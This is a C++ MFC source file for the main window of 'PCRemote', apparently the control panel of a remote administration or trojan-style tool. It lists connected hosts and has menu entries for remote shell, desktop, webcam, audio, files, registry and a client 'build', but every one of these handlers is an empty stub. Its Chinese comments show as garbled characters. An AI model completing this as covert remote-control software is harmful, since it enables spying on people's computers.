
// PCRemoteDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "PCRemote.h"
#include "PCRemoteDlg.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

typedef struct
{
	char *title;
	int  nWidth;
}COLUMNSTRUCT;

COLUMNSTRUCT g_Column_Online_Data[] =
{
	{"IP",				148	},
	{"����",			150	},
	{"�������/��ע",	160	},
	{"����ϵͳ",		128	},
	{"CPU",				80	},
	{"����ͷ",			81	},
	{"PING",			81	}
};

int g_Column_Online_Count = 7;//online�б� �еĸ���
int g_Column_Online_Width = 0;//online�б��ܿ��

COLUMNSTRUCT g_Column_Message_Data[] = 
{
	{"��Ϣ����",		68	},
	{"ʱ��",			100	},
	{"��Ϣ����",	    660	}
};

int g_Column_Message_Count= 3;//Message�б� �еĸ���
int g_Column_Message_Width = 0;//Message�б��ܿ��

// ����Ӧ�ó��򡰹��ڡ��˵���� CAboutDlg �Ի���

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// �Ի�������
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

// ʵ��
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CPCRemoteDlg �Ի���




CPCRemoteDlg::CPCRemoteDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CPCRemoteDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	iCount = 0;
}

void CPCRemoteDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_ONLINE, m_CList_Online);
	DDX_Control(pDX, IDC_MESSAGE, m_CList_Message);
}

BEGIN_MESSAGE_MAP(CPCRemoteDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_NOTIFY(NM_RCLICK, IDC_ONLINE, &CPCRemoteDlg::OnNMRClickOnline)
	ON_COMMAND(IDM_ONLINE_AUDIO, &CPCRemoteDlg::OnOnlineAudio)
	ON_COMMAND(IDM_ONLINE_CMD, &CPCRemoteDlg::OnOnlineCmd)
	ON_COMMAND(IDM_ONLINE_DESKTOP, &CPCRemoteDlg::OnOnlineDesktop)
	ON_COMMAND(IDM_ONLINE_FILE, &CPCRemoteDlg::OnOnlineFile)
	ON_COMMAND(IDM_ONLINE_PROCESS, &CPCRemoteDlg::OnOnlineProcess)
	ON_COMMAND(IDM_ONLINE_REGEDIT, &CPCRemoteDlg::OnOnlineRegedit)
	ON_COMMAND(IDM_ONLINE_SERVER, &CPCRemoteDlg::OnOnlineServer)
	ON_COMMAND(IDM_ONLINE_VIDEO, &CPCRemoteDlg::OnOnlineVideo)
	ON_COMMAND(IDM_ONLINE_WINDOW, &CPCRemoteDlg::OnOnlineWindow)
	ON_COMMAND(IDM_ONLINE_DELETE, &CPCRemoteDlg::OnOnlineDelete)
	ON_COMMAND(IDM_MAIN_ABOUT, &CPCRemoteDlg::OnMainAbout)
	ON_COMMAND(IDM_MAIN_BUILD, &CPCRemoteDlg::OnMainBuild)
	ON_COMMAND(IDM_MAIN_CLOSE, &CPCRemoteDlg::OnMainClose)
	ON_COMMAND(IDM_MAIN_SET, &CPCRemoteDlg::OnMainSet)
END_MESSAGE_MAP()


// CPCRemoteDlg ��Ϣ�������

BOOL CPCRemoteDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// ��������...���˵�����ӵ�ϵͳ�˵��С�

	// IDM_ABOUTBOX ������ϵͳ���Χ�ڡ�
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// ���ô˶Ի����ͼ�ꡣ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	// TODO: �ڴ���Ӷ���ĳ�ʼ������
	m_MainMemu.LoadMenu(IDR_MENU_MAIN);			//�������˵�
	SetMenu(&m_MainMemu);

	InitList();//��ʼ���б�
	CreateStatusBar();

	ShowMessage(true,"�����ʼ���ɹ�...");

	CRect rect;
	GetWindowRect(rect);
	rect.bottom += 20;
	MoveWindow(rect);

	test();
	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

void CPCRemoteDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CPCRemoteDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CPCRemoteDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CPCRemoteDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	// TODO: �ڴ˴������Ϣ����������
	double dcx = cx; //��ǰ�Ի�����ܿ��

	if (m_CList_Online.m_hWnd != NULL)
	{
		CRect rc;
		rc.left		= 1;
		rc.top		= 80;
		rc.right	= cx-1;
		rc.bottom	= cy-160;
		m_CList_Online.MoveWindow(rc);
		
		for (int i = 0; i < g_Column_Online_Count; i++)
		{
			double dd = g_Column_Online_Data[i].nWidth;
			dd /= g_Column_Online_Width;
			dd *= dcx;
			int lenth = dd;
			m_CList_Online.SetColumnWidth(i, lenth);
		}
	}

	if (m_CList_Message.m_hWnd != NULL)
	{
		CRect rc;
		rc.left		= 1;
		rc.top		= cy-156;
		rc.right	= cx-1;
		rc.bottom	= cy-20;
		m_CList_Message.MoveWindow(rc);

		for (int i = 0; i < g_Column_Message_Count; i++)
		{
			double dd = g_Column_Message_Data[i].nWidth;
			dd /= g_Column_Message_Width;
			dd *= dcx;
			int lenth = dd;
			m_CList_Message.SetColumnWidth(i, lenth);
		}
	}

	if (m_StatusBar.m_hWnd != NULL)
	{
		CRect rc;
		rc.top		= cy-20;
		rc.left		= 0;
		rc.right	= cx;
		rc.bottom	= cy;
		m_StatusBar.MoveWindow(rc);
		m_StatusBar.SetPaneInfo(0, m_StatusBar.GetItemID(0), SBPS_POPOUT, cx-10);
	}
}

//��ʼ���б�
int CPCRemoteDlg::InitList(void)
{
	m_CList_Online.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	m_CList_Message.SetExtendedStyle(LVS_EX_FULLROWSELECT);

	for (int i = 0; i < g_Column_Online_Count; i++)
	{
		m_CList_Online.InsertColumn(i, g_Column_Online_Data[i].title, LVCFMT_CENTER, g_Column_Online_Data[i].nWidth);
		g_Column_Online_Width += g_Column_Online_Data[i].nWidth;
	}

	for (int i = 0; i < g_Column_Message_Count; i++)
	{
		m_CList_Message.InsertColumn(i, g_Column_Message_Data[i].title, LVCFMT_CENTER, g_Column_Message_Data[i].nWidth);
		g_Column_Message_Width += g_Column_Message_Data[i].nWidth;
	}
	return 0;
}



// add to online list
void CPCRemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing)
{
	m_CList_Online.InsertItem(0, strIP);
	m_CList_Online.SetItemText(0, ONLINELIST_ADDR, strAddr);
	m_CList_Online.SetItemText(0, ONLINELIST_COMPUTER_NAME, strPCName);
	m_CList_Online.SetItemText(0, ONLINELIST_OS, strOS);
	m_CList_Online.SetItemText(0, ONLINELIST_CPU, strCPU);
	m_CList_Online.SetItemText(0, ONLINELIST_VIDEO, strVideo);
	m_CList_Online.SetItemText(0, ONLINELIST_PING, strPing);
	ShowMessage(true, strIP+"��������");
}


// show msg
void CPCRemoteDlg::ShowMessage(bool bIsOK, CString strMsg)
{
	CString strIsOK, strTime;

	CTime t = CTime::GetCurrentTime();
	strTime = t.Format("%H:%M:%S");

	strIsOK = bIsOK ? "ִ�гɹ�" : "ִ��ʧ��";

	m_CList_Message.InsertItem(0, strIsOK);
	m_CList_Message.SetItemText(0, 1, strTime);
	m_CList_Message.SetItemText(0, 2, strMsg);

	if (strMsg.Find("����") > 0)
	{
		iCount++;
	}else if (strMsg.Find("����") > 0 || strMsg.Find("�Ͽ�") >0)
	{
		iCount--;
	} 

	iCount = iCount < 0 ? 0 : iCount;
	CString strStatusMsg;
	strStatusMsg.Format("����:%d", iCount);
	m_StatusBar.SetPaneText(0, strStatusMsg);


}


void CPCRemoteDlg::test(void)
{
	AddList("192.168.0.1","����������","Lang","Windows7","2.2GHZ","��","123232");
	AddList("192.168.0.2","����������","Lang","Windows7","2.2GHZ","��","123232");
	AddList("192.168.0.3","����������","Lang","Windows7","2.2GHZ","��","123232");
}


void CPCRemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	CMenu popup;
	popup.LoadMenu(IDR_MENU_ONLINE);
	CMenu *pM = popup.GetSubMenu(0);
	CPoint p;
	GetCursorPos(&p);
	UINT count = pM->GetMenuItemCount();

	if (m_CList_Online.GetSelectedCount() == 0)
	{
		for (UINT i = 0; i < count; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION|MF_DISABLED|MF_GRAYED);
		}
	}
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
	*pResult = 0;
}


void CPCRemoteDlg::OnOnlineAudio()
{
	// TODO: �ڴ���������������
}


void CPCRemoteDlg::OnOnlineCmd()
{
	// TODO: �ڴ���������������
}


void CPCRemoteDlg::OnOnlineDesktop()
{
	// TODO: �ڴ���������������
}


void CPCRemoteDlg::OnOnlineFile()
{
	// TODO: �ڴ���������������
}


void CPCRemoteDlg::OnOnlineProcess()
{
	// TODO: �ڴ���������������
}


void CPCRemoteDlg::OnOnlineRegedit()
{
	// TODO: �ڴ���������������
}


void CPCRemoteDlg::OnOnlineServer()
{
	// TODO: �ڴ���������������
}


void CPCRemoteDlg::OnOnlineVideo()
{
	// TODO: �ڴ���������������
}


void CPCRemoteDlg::OnOnlineWindow()
{
	// TODO: �ڴ���������������
}


void CPCRemoteDlg::OnOnlineDelete()
{
	// TODO: �ڴ���������������
	CString strIP;
	int nSelect = m_CList_Online.GetSelectionMark();
	strIP = m_CList_Online.GetItemText(nSelect, ONLINELIST_IP);
	m_CList_Online.DeleteItem(nSelect);
	strIP += " �Ͽ�����";
	ShowMessage(true, strIP);
}


void CPCRemoteDlg::OnMainAbout()
{
	// TODO: �ڴ���������������
	CAboutDlg dlgAbout;
	dlgAbout.DoModal();
}


void CPCRemoteDlg::OnMainBuild()
{
	// TODO: �ڴ���������������
}


void CPCRemoteDlg::OnMainClose()
{
	// TODO: �ڴ���������������
	PostMessage(WM_CLOSE, 0, 0);
}


void CPCRemoteDlg::OnMainSet()
{
	// TODO: �ڴ���������������
}

static UINT indicators[] =
{
	IDR_STATUSBAR_STRING
};



// create statusbar
void CPCRemoteDlg::CreateStatusBar(void)
{
	if (!m_StatusBar.Create(this) || 
		!m_StatusBar.SetIndicators(indicators, sizeof(indicators)/sizeof(UINT)))
	{
		TRACE("Failed to create status bar\n");
		return ;
	}
}
